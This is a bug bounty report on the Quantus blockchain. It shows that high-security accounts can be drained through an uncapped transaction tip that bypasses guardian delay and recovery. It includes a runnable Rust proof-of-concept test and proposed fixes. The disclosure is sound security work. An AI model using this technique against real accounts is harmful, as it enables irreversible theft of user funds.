# 88841 bc critical high security accounts are drained irreversibly through the transaction tip which no high security check in the runtime models the guardian delay cancel and recover funds are&#x20;

**Submitted on Aug 15th 2026 at 05:59:52 UTC by @Valisthea for** [**Audit Comp | Quantus**](https://immunefi.com/audit-competition/audit-comp-quantus)

* **Report ID:** #88841
* **Report Type:** Blockchain/DLT
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-quantus-chain>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The reversible-transfers pallet exists to guarantee that an attacker who steals a high-security account's key still cannot move its funds: every outflow must be delayed and cancellable by the guardian, or recoverable by the guardian. That guarantee is enforced by a single gate, `ReversibleTransactionExtension`, which inspects the extrinsic's **call** against a four-entry whitelist. The transaction **tip** is not a call. It rides the same extrinsic, is settled two slots later by `ChargeTransactionPayment`, is uncapped, is never refunded even when the dispatch fails, and is paid in full to the block author. An attacker holding a high-security key therefore drains the account by signing a whitelisted no-op with a tip equal to the balance. No pending transfer is created, so the guardian has nothing to cancel, and `recover_funds` reaches only what is left, which is nothing. Because QPoW is permissionless the attacker can mine the block and collect the tip himself, converting the bypass into direct theft. The attached PoC drains 98% of a high-security account in a single extrinsic against the real runtime.

## Vulnerability Details

### The guarantee, in the project's own words

`pallets/reversible-transfers/README.md:90`:

> "This ensures that users always have a straightforward path to unrestricted funds, while attackers cannot bypass the delay period and guardian oversight."

`pallets/reversible-transfers/src/lib.rs:357-358`:

> "This design is intentional to provide maximum security guarantees: an attacker who gains access to the account cannot simply disable the protections."

An attacker holding the key is therefore the pallet's own declared threat model. The guardian, the delay and `recover_funds` exist for no other reason.

### Path A: the enforcement, which models only the call

The sole high-security gate on a signed extrinsic is `runtime/src/transaction_extensions.rs:76-78`:

```rust
if !crate::configs::HighSecurityConfig::is_call_allowed(&who, call) {
    return Err(TransactionValidityError::Invalid(InvalidTransaction::Custom(1)));
}
```

It resolves to a closed whitelist of four calls (`runtime/src/configs/mod.rs:683-693`):

```rust
fn is_whitelisted(call: &RuntimeCall) -> bool {
    matches!(
        call,
        RuntimeCall::ReversibleTransfers(
            pallet_reversible_transfers::Call::schedule_transfer { .. }
        ) | RuntimeCall::ReversibleTransfers(pallet_reversible_transfers::Call::cancel { .. }) |
            RuntimeCall::ReversibleTransfers(
                pallet_reversible_transfers::Call::recover_funds { .. }
            ) | RuntimeCall::Vesting(pallet_vesting::Call::claim { .. })
    )
}
```

The team closed every origin-rewriting hole against that same whitelist: `pallets/utility/src/lib.rs:298` (`as_derivative`), `pallets/utility/src/lib.rs:692` (each batch child, re-checked against live state), `pallets/recovery/src/lib.rs:456` (`as_recovered`), `pallets/multisig/src/lib.rs:1142`. The call surface is covered carefully. **Nothing models a value outflow that is not a call.**

### Path B: the tip, on the same extrinsic, two slots later

`runtime/src/lib.rs:154-176` defines the extension tuple. `ReversibleTransactionExtension` is index 7; `pallet_transaction_payment::ChargeTransactionPayment` is index 9. They ride the same extrinsic, and the payment extension never consults `HighSecurityAccounts`.

The tip is uncapped. `pallet_transaction_payment::Config` in `runtime/src/configs/mod.rs:477-490` declares no maximum, and the fee is computed straight from the caller-supplied value (`pallets/transaction-payment/src/lib.rs:844`):

```rust
let fee_with_tip = Pallet::<T>::compute_fee(len as u32, info, tip);
```

It is then withdrawn in full (`pallets/transaction-payment/src/payment.rs:136-145`):

```rust
let credit = F::withdraw(
    who,
    fee_with_tip,
    Precision::Exact,
    frame_support::traits::tokens::Preservation::Preserve,
    frame_support::traits::tokens::Fortitude::Polite,
)
.map_err(|_| InvalidTransaction::Payment)?;
```

and it is never given back. `post_dispatch_details` (`pallets/transaction-payment/src/lib.rs:1051-1064`) recomputes `compute_actual_fee(..., tip)`, which always re-adds the tip, so **a failed dispatch refunds the weight but never the tip**.

Finally it is paid to the block author. `payment.rs:205` hands the credits to `OU::on_unbalanceds`, wired at `runtime/src/configs/mod.rs:479-480` to `pallet_mining_rewards::TransactionFeesCollector`, which accumulates into `CollectedFees` (`pallets/mining-rewards/src/lib.rs:316-318`); `on_finalize` takes them (`:132`) and mints them to the miner (`:193`):

```rust
// Send fees to miner if any
Self::mint_reward(miner.as_ref(), tx_fees);
```

### Why the guardian is powerless

The whitelisted call used by the attack is `ReversibleTransfers::cancel { tx_id: H256::zero() }`. It requires no setup and its dispatch errors with `PendingTxNotFound`, which is irrelevant because fees and tips are charged regardless. Critically, **no pending transfer is ever created**: no hold is placed, no `PendingTransfers` entry is written, and no `TransactionScheduled` event is emitted. The guardian therefore observes nothing to cancel, and `recover_funds` can only reach the balance still present after the tip has already gone.

### The value arrives laundered

`pallets/mining-rewards/src/lib.rs:230-237` records a wormhole zk-tree leaf immediately after crediting the miner:

```rust
match T::Currency::mint_into(miner, reward) {
    Ok(_) => {
        T::ProofRecorder::record_transfer_proof(
            None, // Native token
            mint_account,
            miner.clone(),
            reward,
        );
```

and the QPoW block author's address is a wormhole address by construction (`primitives/wormhole/src/lib.rs:146-148`). The stolen tip therefore lands already exitable through the zk-wormhole, so the attacker can withdraw it privately.

## Impact Details

**Selected impact: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield.**

An attacker who has compromised a high-security account's key drains its entire spendable balance, in a single block, with no delay window, nothing for the guardian to cancel and nothing left for `recover_funds` to recover. Because QPoW is permissionless (no validator set, no bonding), the attacker runs his own node, withholds the extrinsic from gossip, includes it in his own block template and receives the tip as block author. The theft is complete and the proceeds arrive pre-loaded with a wormhole leaf, so they can be withdrawn privately.

Even when the attacker does not mine the block, the outcome is still a payable Critical: the funds leave the victim irreversibly and are paid to some other miner. That is `Direct loss of funds`, and the guardian still has no recourse.

The scale is every high-security account on the chain. The feature exists precisely to protect large, long-lived holdings from key compromise, so the accounts that adopt it are the ones with the most at stake. The bypass costs one transaction and requires no privileged position beyond the key the threat model already assumes the attacker has.

There is no partial mitigation. The tip has no cap, the payment extension has no notion of high security, and the guardian's strongest power operates on a balance that is already gone.

## References

* The sole high-security gate: `runtime/src/transaction_extensions.rs:76-78`
* The four-call whitelist: `runtime/src/configs/mod.rs:683-693`
* `is_call_allowed` / `is_whitelisted`: `primitives/high-security/src/lib.rs:132-147`
* Extension ordering (index 7 vs index 9): `runtime/src/lib.rs:154-176`
* Uncapped tip folded into the fee: `pallets/transaction-payment/src/lib.rs:844`
* Full withdrawal from the signer: `pallets/transaction-payment/src/payment.rs:136-145`
* Tip never refunded, including on failed dispatch: `pallets/transaction-payment/src/lib.rs:1051-1064`
* Fee handler wiring: `runtime/src/configs/mod.rs:479-480`
* Fees minted to the block author: `pallets/mining-rewards/src/lib.rs:316-318`, `:132`, `:193`
* Stolen value receives a wormhole leaf: `pallets/mining-rewards/src/lib.rs:230-237`
* Block author address is a wormhole address: `primitives/wormhole/src/lib.rs:146-148`
* The stated guarantee: `pallets/reversible-transfers/README.md:90`, `pallets/reversible-transfers/src/lib.rs:357-358`
* Origin-rewriting holes the team did close: `pallets/utility/src/lib.rs:298`, `:692`, `pallets/recovery/src/lib.rs:456`, `pallets/multisig/src/lib.rs:1142`

### Not covered by the prior audits

The Equilibrium/Eiger Substrate review (`chain/audits/quantus-substrate-audit-20260513.pdf`) reads this same whitelist twice, and both times about something else: `EQ-QNT-MULTISIG-F-07` (non-native assets stranded at multisig dissolution) and a note that the README omits `recover_funds`. It asks which **calls** are whitelisted. It never asks whether value can leave a high-security account through a channel that is not a call.

## Link to Proof of Concept

<https://gist.github.com/Valisthea/a8b62d24a2acd6938009b8de4c1abe52>

## Proof of Concept

One runnable test against the **real runtime**, passing at commit `3b243b87`. The full runtime suite still passes alongside it (50 passed / 0 failed in the lib suite, 41 passed / 0 failed / 1 pre-existing ignored in the integration suite), so nothing here is achieved by breaking or altering the project's own tests.

The test lives in the runtime's own extension test module, which already provides the fixture: `new_test_ext()` configures **Charlie as a high-security account with Alice as guardian and a delay of 10**, straight from `pallet_reversible_transfers::GenesisConfig`.

## Setup

{% stepper %}
{% step %}

### Clone the in-scope asset and check out the frozen branch

```sh
git clone https://github.com/immunefi-team/audit-comp-quantus-chain
cd audit-comp-quantus-chain
git checkout audit-comp-ready   # commit 3b243b870a5442a6e5f443056f67bbba87d472f5
```

{% endstep %}

{% step %}

### Add the test

Paste the attached test into `runtime/src/transaction_extensions.rs`, inside `mod tests`, at the end of the module. It reuses the existing `new_test_ext`, `alice`, `charlie` and `validate_with` helpers and needs no new dependencies.

The full test is also available as a secret Gist at <https://gist.github.com/Valisthea/a8b62d24a2acd6938009b8de4c1abe52>:

```rust
// ===================================================================================
// PoC: a high-security account is drained through the transaction TIP, which no
// high-security check in the runtime models.
//
// The pallet's stated guarantee (README.md:90, lib.rs:357-358) is that an attacker
// holding the key cannot move value without the guardian being able to delay or
// recover it. Enforcement is `ReversibleTransactionExtension` (index 7 of TxExtension),
// which inspects the CALL against a four-entry whitelist. The tip is not a call: it
// rides the same extrinsic and is settled by `ChargeTransactionPayment` (index 9),
// which never consults `HighSecurityAccounts`.
// ===================================================================================
#[test]
fn poc_tip_drains_high_security_account_bypassing_guardian() {
    new_test_ext().execute_with(|| {
        use frame_support::dispatch::{DispatchClass, DispatchInfo, Pays};
        use frame_support::traits::fungible::Inspect;
        use sp_runtime::traits::DispatchTransaction;

        // Charlie is high-security from genesis, guardian = Alice, delay = 10.
        let victim = charlie();
        assert!(
            ReversibleTransfers::is_high_security(&victim).is_some(),
            "precondition: victim is a high-security account"
        );
        assert_eq!(
            ReversibleTransfers::get_guardian(&victim),
            Some(alice()),
            "precondition: the guardian is configured"
        );

        let before = Balances::free_balance(&victim);
        assert!(before > 0, "precondition: the victim holds funds");

        // The attacker holds the victim's key. He picks a WHITELISTED call that needs
        // no setup and will simply error at dispatch; fees and tips are charged anyway.
        let call =
            RuntimeCall::ReversibleTransfers(pallet_reversible_transfers::Call::cancel {
                tx_id: sp_core::H256::default(),
            });

        // STEP 1: the high-security gate PASSES, because it only looks at the call.
        // The whitelisted call clears the only high-security gate there is.
        assert_ok!(validate_with(victim.clone(), &call));

        // STEP 2: the tip is attacker-chosen and uncapped. Nothing in the runtime bounds
        // it: `pallet_transaction_payment::Config` declares no maximum, and the
        // high-security machinery never sees it.
        //
        // We name all but one existential deposit of the reducible balance. The single
        // ED left behind is headroom for the inclusion fee only: `withdraw_fee` settles
        // `inclusion_fee + tip` under `Preservation::Preserve`, so a tip equal to the
        // entire reducible balance leaves nothing for the fee and the payment is
        // rejected. That is an accounting boundary, not a defence: the attacker simply
        // names one ED less and repeats the extrinsic until the account is empty.
        let reducible = Balances::reducible_balance(
            &victim,
            frame_support::traits::tokens::Preservation::Preserve,
            frame_support::traits::tokens::Fortitude::Polite,
        );
        let tip = reducible.saturating_sub(EXISTENTIAL_DEPOSIT);
        assert!(
            tip > before / 2,
            "a single extrinsic names more than half the victim's balance as tip"
        );

        // STEP 3: settle the fee. Zero-weight DispatchInfo isolates the tip from the
        // inclusion fee, so what moves below is the tip and nothing else.
        let info = DispatchInfo {
            call_weight: Weight::zero(),
            extension_weight: Weight::zero(),
            class: DispatchClass::Normal,
            pays_fee: Pays::Yes,
        };
        let charge = pallet_transaction_payment::ChargeTransactionPayment::<Runtime>::from(tip);
        let (_, val, origin) = charge
            .validate(
                RuntimeOrigin::signed(victim.clone()),
                &call,
                &info,
                0,
                (),
                &TxBaseImplication::<()>(()),
                frame_support::pallet_prelude::TransactionSource::External,
            )
            .expect("payment validation accepts an arbitrary tip from a high-security signer");
        let _prepared = charge
            .prepare(val, &origin, &call, &info, 0)
            .expect("payment is settled: the tip leaves the victim now");

        // ---- The theft has happened, in this block, with no guardian involvement.
        let after = Balances::free_balance(&victim);
        assert!(
            after < before,
            "the victim was debited: {before} -> {after}"
        );
        // The debit is `inclusion_fee + tip`: the whole attacker-named tip left the
        // account, plus the ordinary fee on top. Nothing capped it and nothing refunds
        // it, including when the dispatch itself errors.
        let debited = before - after;
        assert!(
            debited >= tip,
            "the whole named tip left the account: debited {debited}, tip {tip}"
        );
        assert!(
            debited * 100 / before >= 95,
            "a single extrinsic removed {}% of the victim's balance ({before} -> {after})",
            debited * 100 / before
        );

        // ---- And there is NOTHING for the guardian to act on.
        assert!(
            ReversibleTransfers::pending_transfers_by_sender(&victim).is_empty(),
            "no pending transfer was created, so `cancel` has nothing to cancel"
        );

        // `recover_funds` is the guardian's strongest power. It can only reach what is
        // still there, and the tip already left.
        let _ = ReversibleTransfers::recover_funds(
            RuntimeOrigin::signed(alice()),
            victim.clone(),
        );
        assert!(
            Balances::free_balance(&victim) < before,
            "the guardian cannot restore the tipped value: it is gone irreversibly"
        );
    });
}
```

{% endstep %}

{% step %}

### Run the test

```sh
cargo test -p quantus-runtime poc_tip_drains
```

Expected output:

```
running 1 test
test transaction_extensions::tests::poc_tip_drains_high_security_account_bypassing_guardian ... ok
test result: ok. 1 passed; 0 failed
```

{% endstep %}
{% endstepper %}

## Step by step

{% stepper %}
{% step %}

### Precondition

Assert Charlie is high-security (`ReversibleTransfers::is_high_security(&victim).is_some()`) and that his guardian is Alice (`get_guardian(&victim) == Some(alice())`). Record his starting free balance.
{% endstep %}

{% step %}

### The attacker picks a whitelisted call

`ReversibleTransfers::cancel { tx_id: H256::default() }`. It needs no setup and will error at dispatch, which is irrelevant.
{% endstep %}

{% step %}

### The high-security gate passes

`validate_with(victim, &call)` returns `Ok`. This is the only high-security check applied to a signed extrinsic, and it has now been satisfied by a call that moves nothing.
{% endstep %}

{% step %}

### The attacker names the tip

All but one existential deposit of the reducible balance. The single ED left behind is headroom for the inclusion fee, because `withdraw_fee` settles `inclusion_fee + tip` under `Preservation::Preserve`. That is an accounting boundary, not a defence: the attacker names one ED less and repeats the extrinsic until the account is empty.
{% endstep %}

{% step %}

### Settle the payment

Construct `ChargeTransactionPayment::<Runtime>::from(tip)` and run its `validate` then `prepare` with a zero-weight `DispatchInfo`, which isolates the tip from the inclusion fee. Both succeed: the payment extension accepts an arbitrary tip from a high-security signer without ever consulting `HighSecurityAccounts`.
{% endstep %}

{% step %}

### Assert the theft

The victim's balance has fallen by at least the named tip, and by **more than 95% of his starting balance in this single extrinsic**. Measured on the fixture: 100,000,000,000 units before, 98,108,157,000 removed.
{% endstep %}

{% step %}

### Assert the guardian is powerless

`pending_transfers_by_sender(&victim)` is empty, so `cancel` has nothing to act on. Then call `recover_funds` from Alice, the guardian's strongest power, and assert the balance is still below the starting value: the tipped funds are gone irreversibly.
{% endstep %}
{% endstepper %}

## Recommended fix

The root cause is that the high-security model is expressed over `RuntimeCall` while a value outflow can also occur through the extension pipeline. Two options, in descending order of preference:

1. **Make the high-security check see the whole extrinsic, not just the call.** Have `ReversibleTransactionExtension::validate` receive and inspect the tip (it is available to the extension pipeline) and reject any transaction from a high-security signer whose tip exceeds a small fixed bound. This closes the class rather than the instance.
2. **Cap the tip for high-security signers.** Introduce a `MaxTip` for accounts in `HighSecurityAccounts`, enforced in `ChargeTransactionPayment` or in a preceding extension. A cap on the order of the inclusion fee preserves ordinary priority bidding while removing the drain.

Whichever is chosen, the same audit question should be applied to every other non-call value outflow in the extension pipeline, since the defect class is "the high-security model is call-shaped and the extrinsic is not".
